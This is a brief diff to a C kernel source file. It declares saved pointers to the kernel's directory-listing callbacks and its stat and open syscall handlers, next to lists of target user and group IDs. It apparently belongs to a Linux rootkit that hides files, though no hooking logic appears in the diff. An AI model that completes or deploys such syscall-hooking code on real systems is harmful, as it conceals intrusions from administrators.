@@ -1,5 +1,24 @@
 #include "files.h"
 
+bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) = NULL;
+bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) = NULL;
+
+asmlinkage long (*real_sys_stat)(struct pt_regs *regs) = NULL;
+asmlinkage long (*real_sys_lstat)(struct pt_regs *regs) = NULL;
+asmlinkage long (*real_sys_newstat)(struct pt_regs *regs) = NULL;
+asmlinkage long (*real_sys_newlstat)(struct pt_regs *regs) = NULL;
+asmlinkage long (*real_sys_newfstatat)(struct pt_regs *regs) = NULL;
+asmlinkage long (*real_sys_statx)(struct pt_regs *regs) = NULL;
+
+asmlinkage long (*real_sys_open)(struct pt_regs *regs) = NULL;
+asmlinkage long (*real_sys_openat)(struct pt_regs *regs) = NULL;
+asmlinkage long (*real_sys_openat2)(struct pt_regs *regs) = NULL;
+
+struct Extended_array {
+    void *array_addr;
+    int array_size;
+};
+
 unsigned int uids[] = {1001};
 unsigned int gids[] = {1002};
 struct Extended_array ea_uids = {uids, sizeof(uids) / sizeof(uids[0])};
